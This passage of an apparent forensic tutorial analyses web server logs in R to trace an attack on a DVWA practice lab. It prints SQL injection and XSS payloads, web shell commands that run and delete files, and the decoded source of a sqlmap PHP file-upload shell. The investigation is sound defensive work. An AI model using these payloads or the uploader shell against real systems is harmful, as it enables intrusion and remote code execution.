<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=a%27+and+0%3D0+union+select+column_name%2C+null+from+information_schema.columns+where+table_name+%3D+%27users%27+--+&Submit=Submit>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=a%27+or+1%3D1+--+&Submit=Submit>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=abc%27+and+0%3D0+union+select+table_name%2C+null+from+information_schema.tables+--+&Submit=Submit>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/xss_r/>.
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/xss_r/>.?name=Peter%2bWinter
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=%3Ch1%3EXSS%3C%2Fh1%3E>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ewindows.location%3D%22http%3A%2F%2F192.168.56.102%22%3C%2Fscript%3E>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=ali>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=Ali>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=XSS>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/xss_s/>.
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/icons/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/icons/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/icons/small/?C=D;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/icons/small/?C=M;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/icons/small/?C=N;O=D>
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/icons/small/?C=S;O=A>
</td>
<td style="text-align:right;">
1
</td>
</tr>
</tbody>
</table>

And now let’s hone in on anything with “vulnerabilities”, “security”, or
“exec” in the URL.

    suspicious_activity |>
        filter(str_detect(referer, "vulnerabilities|security|exec")) |>
        count(referer, sort=TRUE) |>
        head(10)

    ## # A tibble: 10 × 2
    ##    referer                                                                     n
    ##    <chr>                                                                   <int>
    ##  1 http://192.168.56.101/dvwa/vulnerabilities/exec/                           32
    ##  2 http://192.168.56.101/dvwa/vulnerabilities/                                17
    ##  3 http://192.168.56.101/dvwa/security.php                                    16
    ##  4 http://192.168.56.101/dvwa/vulnerabilities/xss_s/                          10
    ##  5 http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit         5
    ##  6 http://192.168.56.101/dvwa/vulnerabilities/xss_r/                           5
    ##  7 http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=a%27+union+select+…     4
    ##  8 http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=a%27+or+%271%27+%3…     3
    ##  9 http://192.168.56.101/dvwa/vulnerabilities/brute/.                          2
    ## 10 http://192.168.56.101/dvwa/vulnerabilities/sqli/                            2

This is pretty enlightening as we get quite a few leads. There are calls
to `sqli`, `xss_s`, `xss_r`, and `brute`, which all seem interesting.
I’m going to start with `sqli` and get a sense of the commands being
run.

    suspicious_activity |>
        filter(str_detect(referer, "sqli/\\?")) |>
        mutate(cmd = str_replace(
            referer,
            "http://192.168.56.101/dvwa/vulnerabilities/sqli/\\?",
            "")
        ) |>
        count(cmd, sort=TRUE) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
cmd
</th>
<th style="text-align:right;">
n
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
id=1&Submit=Submit
</td>
<td style="text-align:right;">
5
</td>
</tr>
<tr>
<td style="text-align:left;">
id=a%27+union+select+user%28%29%2C+database%28%29+–+&Submit=Submit
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
id=a%27+or+%271%27+%3D+%271&Submit=Submit
</td>
<td style="text-align:right;">
3
</td>
</tr>
<tr>
<td style="text-align:left;">
id=2&Submit=Submit
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
id=abc%27+and+0%3D0+union+select+table_name%2C+null+from+information_schema.tables+where+table_name+like+%22user%25%22–+&Submit=Submit
</td>
<td style="text-align:right;">
2
</td>
</tr>
<tr>
<td style="text-align:left;">
<id=1&Submit=Submit&id=555-555-0199@example.com>&Submit=Submit
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<id=1&Submit=Submit&id=555-555-0199@example.com>&<Submit=Submit&id=555-555-0199@example.com>&Submit=Submit
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<id=1&Submit=Submit&id=555-555-0199@example.com>&<Submit=Submit&id=555-555-0199@example.com>&<Submit=Submit&id=555-555-0199@example.com>&Submit=Submit
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
<id=1&Submit=Submit&id=555-555-0199@example.com>&<Submit=Submit&id=555-555-0199@example.com>&<Submit=Submit&id=555-555-0199@example.com>&<Submit=Submit&id=555-555-0199@example.com>&Submit=Submit
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
id=3&Submit=Submit
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
id=4&Submit=Submit
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
id=5&Submit=Submit
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
id=6&Submit=Submit
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
id=a%27+and+0%3D0+union+select+column_name%2C+null+from+information_schema.columns+where+table_name+%3D+%27users%27+–+&Submit=Submit
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
id=a%27+or+1%3D1+–+&Submit=Submit
</td>
<td style="text-align:right;">
1
</td>
</tr>
<tr>
<td style="text-align:left;">
id=abc%27+and+0%3D0+union+select+table_name%2C+null+from+information_schema.tables+–+&Submit=Submit
</td>
<td style="text-align:right;">
1
</td>
</tr>
</tbody>
</table>

And what happens if we run the same request on the `resource` field?
There are 1,270 unique combinations of queries (I cheated and ran a
query not included here), so focusing on the top 10 to see if there are
any commands that are repeated frequently will be more valuable to look
at.

    suspicious_activity |>
        filter(str_detect(resource, "sqli/\\?")) |>
        mutate(cmd = str_replace(
            resource,
            "/dvwa/vulnerabilities/sqli/\\?",
            ""
        )) |>
        count(cmd, sort=TRUE) |>
        head(10) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
cmd
</th>
<th style="text-align:right;">
n
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
id=2&Submit=Submit
</td>
<td style="text-align:right;">
44
</td>
</tr>
<tr>
<td style="text-align:left;">
id=2%20ORDER%20BY%201–%20&Submit=Submit
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
id=2%20ORDER%20BY%201%23&Submit=Submit
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
id=2%20UNION%20ALL%20SELECT%20NULL–%20&Submit=Submit
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
id=2%20UNION%20ALL%20SELECT%20NULL%23&Submit=Submit
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL–%20&Submit=Submit
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%23&Submit=Submit
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL–%20&Submit=Submit
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23&Submit=Submit
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL–%20&Submit=Submit
</td>
<td style="text-align:right;">
8
</td>
</tr>
</tbody>
</table>

A lot of these commands all include the word “Submit”. I wonder if there
are commands that don’t include that.

    suspicious_activity |>
        filter(str_detect(resource, "sqli/\\?")) |>
        filter(!str_detect(resource, "Submit")) |>
        mutate(cmd = str_replace(
            resource,
            "/dvwa/vulnerabilities/sqli/\\?",
            ""
        )) |>
        count(cmd, sort=TRUE) |>
        head(10) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
cmd
</th>
<th style="text-align:right;">
n
</th>
</tr>
</thead>
<tbody>
<tr>
</tr>
</tbody>
</table>

No, so all of them include “Submit”. Let’s try looking for some that
aren’t `SELECT` or `UNION` calls? I’m effectively trying to find unique
commands that aren’t what appear to be the attackers attempt to find SQL
commands that work. And since we know that every command will have
`&Submit=Submit`, let’s chop that off, just to clean it up a bit. Also,
let’s decode the commands to try to get a better sense of what they’re
doing. I’m also going to cheat once again and only show the results that
I felt were interesting from this query, which I found by running the
query and reading through the results.

    suspicious_activity |>
        filter(str_detect(resource, "sqli/\\?")) |>
        filter(!str_detect(resource, "SELECT|UNION")) |>
        mutate(cmd = str_replace_all(
            resource,
            "/dvwa/vulnerabilities/sqli/\\?|&Submit=Submit",
            ""
        )) |>
        mutate(cmd = urltools::url_decode(cmd)) |>
        filter(str_detect(cmd, 'php')) |>
        select(ip, date, time, method, cmd) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
ip
</th>
<th style="text-align:left;">
date
</th>
<th style="text-align:left;">
time
</th>
<th style="text-align:left;">
method
</th>
<th style="text-align:left;">
cmd
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
192.168.56.102
</td>
<td style="text-align:left;">
2015-09-02
</td>
<td style="text-align:left;">
04:25:52 -0700
</td>
<td style="text-align:left;">
GET
</td>
<td style="text-align:left;">
id=2’ LIMIT 0,1 INTO OUTFILE ‘/xampp/htdocs/tmpukudk.php’ LINES
TERMINATED BY
0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a–
–
</td>
</tr>
<tr>
<td style="text-align:left;">
192.168.56.102
</td>
<td style="text-align:left;">
2015-09-02
</td>
<td style="text-align:left;">
23:52:24 -0700
</td>
<td style="text-align:left;">
GET
</td>
<td style="text-align:left;">
id=2’ LIMIT 0,1 INTO OUTFILE ‘/xampp/htdocs/tmpudvfh.php’ LINES
TERMINATED BY
0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a–
–
</td>
</tr>
</tbody>
</table>

These two records stuck out to me as they seem to be creating two unique
PHP files, and I’m curious what those hex values (ostensibly) are. But
first, I want to see if these files are mentioned in other places in the
logs. Let’s look at one specific file.

    suspicious_activity |>
        filter(str_detect(resource, "tmpudvfh.php")) |>
        mutate(resource=urltools::url_decode(resource)) |>
        select(time, resource) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
time
</th>
<th style="text-align:left;">
resource
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
23:52:24 -0700
</td>
<td style="text-align:left;">
/dvwa/vulnerabilities/sqli/?id=2’ LIMIT 0,1 INTO OUTFILE
‘/xampp/htdocs/tmpudvfh.php’ LINES TERMINATED BY
0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a–
– &Submit=Submit
</td>
</tr>
<tr>
<td style="text-align:left;">
23:52:24 -0700
</td>
<td style="text-align:left;">
/xampp/htdocs/tmpudvfh.php
</td>
</tr>
<tr>
<td style="text-align:left;">
23:52:24 -0700
</td>
<td style="text-align:left;">
/htdocs/tmpudvfh.php
</td>
</tr>
<tr>
<td style="text-align:left;">
23:52:24 -0700
</td>
<td style="text-align:left;">
/tmpudvfh.php
</td>
</tr>
<tr>
<td style="text-align:left;">
23:52:24 -0700
</td>
<td style="text-align:left;">
/tmpudvfh.php
</td>
</tr>
<tr>
<td style="text-align:left;">
23:59:38 -0700
</td>
<td style="text-align:left;">
/tmpbrjvl.php?cmd=del /F /Q C:.php
</td>
</tr>
</tbody>
</table>

Oh, interesting. There are a few entries in the log here. Look at that
last entry; it looks like it’s deleting itself. Sneaky. Are there other
`tmp.*.php` files?

    suspicious_activity |>
        mutate(file=str_extract(resource, "tmp.+?\\.php")) |>
        filter(!is.na(file)) |>
        count(file, sort=TRUE) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
file
</th>
<th style="text-align:right;">
n
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
tmpudvfh.php
</td>
<td style="text-align:right;">
5
</td>
</tr>
<tr>
<td style="text-align:left;">
tmpukudk.php
</td>
<td style="text-align:right;">
5
</td>
</tr>
<tr>
<td style="text-align:left;">
tmpbiwuc.php
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
tmpbrjvl.php
</td>
<td style="text-align:right;">
3
</td>
</tr>
</tbody>
</table>

I see 4 unique PHP files being utilized in the logs. We’re definitely
going to want to dig into this more. Let’s start by digging into those
hex values and convert them to text. The following code does this by
extracting those hex values out of the logs, removes the “0x” prefix,
and then deduplicates the values. Once the values have been extracted, a
function to convert the hex to string is implemented, and then the hex
values are looped over and run through the function. The results are
then printed to the screen.

    hex_values <- suspicious_activity |>
        filter(str_detect(resource, "tmp.+\\.php")) |>
        mutate(hex = str_extract(resource, "0x[a-f0-9]+")) |>
        mutate(hex = str_replace(hex, "0x", "")) |>
        filter(!is.na(hex)) |>
        pull(hex) |>
        unique()

    convert_hex_to_string <- function(hex) {
        hex <- sapply(
            seq(1, nchar(hex), by=2),
            function(x) substr(hex, x, x + 1)
        )
        
        result <- gsub(
            '[^[:print:]]+', 
            '', 
            rawToChar(as.raw(strtoi(hex, 16L)))
        )
        return(result)
    }

    results <- unname(sapply(hex_values, convert_hex_to_string))
    cat(results)

    ## <?phpif (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];if (phpversion()<'4.1.0'){$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();}else{$file=$_FILES["file"]["name"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();}@chmod($dir."/".$file,0755);echo "File uploaded";}else {echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=\\xampp\\htdocs\\> <input type=submit name=upload value=upload></form>";}?>

Let’s clean that up a bit to make it easier to read.

    <?php
    if (isset($_REQUEST["upload"])) {
        $dir = $_REQUEST["uploadDir"];
        
        if (phpversion()<'4.1.0') { 
            $file = $HTTP_POST_FILES["file"]["name"];
            @move_uploaded_file(
                $HTTP_POST_FILES["file"]["tmp_name"], 
                $dir."/".$file
            ) or die();
        }
        else {
            $file=$_FILES["file"]["name"];
            @move_uploaded_file(
                $_FILES["file"]["tmp_name"], 
                $dir."/".$file
            ) or die();
        }
        
        @chmod($dir."/".$file, 0755);
        echo "File uploaded";
    }
    else {
        echo "
        <form 
            action=".$_SERVER["PHP_SELF"]."
            method=POST
            enctype=multipart/form-data
        >
            <input type=hidden name=MAX_FILE_SIZE value=1000000000>
                <b>sqlmap file uploader</b>
                <br>
                <input name=file type=file>
                <br>
                to directory: 
                <input type=text name=uploadDir value=\\xampp\\htdocs\\>
                <input type=submit name=upload value=upload>
        </form>
        ";
    }
    ?>

Clearly the attacker is uploading PHP files to create web shells, right?
Doesn’t this mean we should be able to see calls to those files getting
made in the logs?

    processed |>
        filter(str_detect(resource, "\\.php\\?")) |>
        mutate(resource = urltools::url_decode(resource)) |>
        select(resource) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
resource
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
/dvwa/security.php?phpids=on
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/security.php?test=“&gt;
<script>eval(window.name)</script>
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/security.php?phpids=off
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/instructions.php?doc=PHPIDS-license
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/ids_log.php?clear_log=Clear+Log
</td>
</tr>
<tr>
<td style="text-align:left;">
/tmpbiwuc.php?cmd=echo command execution test
</td>
</tr>
<tr>
<td style="text-align:left;">
/tmpbiwuc.php?cmd=dir
</td>
</tr>
<tr>
<td style="text-align:left;">
/tmpbiwuc.php?cmd=del /F /Q C:.php
</td>
</tr>
<tr>
<td style="text-align:left;">
/tmpbiwuc.php?cmd=del /F /Q .php
</td>
</tr>
<tr>
<td style="text-align:left;">
/tmpbrjvl.php?cmd=echo command execution test
</td>
</tr>
<tr>
<td style="text-align:left;">
/tmpbrjvl.php?cmd=del /F /Q C:.php
</td>
</tr>
<tr>
<td style="text-align:left;">
/tmpbrjvl.php?cmd=del /F /Q .php
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/hackable/uploads/phpshell.php?dir
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/hackable/uploads/phpshell.php?cmd=dir
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/hackable/uploads/phpshell.php?cmd=dir C:\\
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/hackable/uploads/phpshell.php?cmd=mkdir abc
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/hackable/uploads/phpshell.php?cmd=dir
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=home
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=search
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=buffer
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=sort_asc
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=small_dir
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=ext_diz
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=ext_lnk
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=ext_htaccess
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=change
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=download
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=ext_md
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=ext_txt
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=ext_php
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=forward
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=up
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=ext_ico
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=arrow_ltr
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=refresh
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=ext_ini
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=ext_zip
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=img&img=back
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=cmd
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/c99.php?act=cmd
</td>
</tr>
</tbody>
</table>
